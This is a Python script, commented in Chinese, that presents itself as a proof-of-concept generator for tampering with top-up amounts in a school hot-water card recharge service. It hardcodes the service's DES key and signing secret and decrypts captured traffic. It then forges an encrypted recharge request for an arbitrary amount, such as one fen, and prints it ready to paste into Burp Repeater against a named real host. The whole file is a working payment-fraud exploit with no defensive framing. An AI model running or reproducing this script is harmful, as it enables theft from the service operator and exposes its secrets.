#!/usr/bin/env python3
"""
智德水卡充值系统 — 金额篡改 PoC 生成器
用法:
  1. 先用 ProxyPin 抓一条合法的 HotWaterRecharge2 请求（任意金额），复制请求体 HEX
  2. python3 gen_poc.py --hex <你抓到的请求体HEX>  # 解密查看你的账号信息
  3. python3 gen_poc.py --tamper --qr <卡机QR内容> --usi <你的USI_Id> --si <你的SI_Id> --money 1
"""
import argparse, hashlib, json, time, random
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad, unpad

KEY = IV = b'a1@998#.'

def des_decrypt(hex_str: str) -> str:
    raw = bytes.fromhex(hex_str.strip().upper())
    return unpad(DES.new(KEY, DES.MODE_CBC, IV).decrypt(raw), 8).decode('utf-8')

def des_encrypt(plaintext: str) -> str:
    raw = pad(plaintext.encode('utf-8'), 8)
    return DES.new(KEY, DES.MODE_CBC, IV).encrypt(raw).hex().upper()

def make_sign(ts: str) -> str:
    return hashlib.md5((ts + 'a1@998#.').encode()).hexdigest().lower()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--hex',    help='解密: 粘贴抓到的请求体HEX')
    parser.add_argument('--tamper', action='store_true', help='生成篡改PoC')
    parser.add_argument('--qr',     help='卡机二维码内容 (qrCodeData)')
    parser.add_argument('--usi',    type=int, help='你的 USI_Id (学生ID)')
    parser.add_argument('--si',     type=int, help='你的 SI_Id (学校ID)')
    parser.add_argument('--money',  type=int, default=1,
                        help='篡改后的金额，单位: 分 (默认=1, 即0.01元)')
    args = parser.parse_args()

    if args.hex:
        print("=== 解密结果 ===")
        plain = des_decrypt(args.hex)
        print(json.dumps(json.loads(plain), indent=2, ensure_ascii=False))
        return

    if args.tamper:
        if not all([args.qr, args.usi, args.si]):
            print("错误: --tamper 需要同时指定 --qr --usi --si")
            return

        ts = time.strftime('%Y%m%d%H%M%S') + str(random.randint(10, 99))
        payload = {
            "qrCodeData":    args.qr,
            "USI_Id":        args.usi,
            "SI_Id":         args.si,
            "RechargeMoney": args.money,
            "ver":           "Android-1.0.32",
            "timestamp":     ts,
            "sign":          make_sign(ts)
        }
        encrypted = des_encrypt(json.dumps(payload, ensure_ascii=False))
        body_len  = len(encrypted)

        print("=== 篡改 PoC ===")
        print(f"原始金额: 由你决定 | 篡改金额: {args.money} 分 ({args.money/100:.2f} 元)")
        print(f"\n明文内容:")
        print(json.dumps(payload, indent=2, ensure_ascii=False))
        print(f"\n--- Burp Repeater 粘贴以下内容 ---")
        print(f"POST http://schoolv3and.denengny.com/Student/HotWaterRecharge2 HTTP/1.1")
        print(f"Accept: */*")
        print(f"Content-Type: application/x-www-form-urlencoded; charset=utf-8")
        print(f"User-Agent: okhttp/3.3.1")
        print(f"Host: schoolv3and.denengny.com")
        print(f"Connection: Keep-Alive")
        print(f"Accept-Encoding: gzip")
        print(f"Content-Length: {body_len}")
        print()
        print(encrypted)

if __name__ == '__main__':
    main()
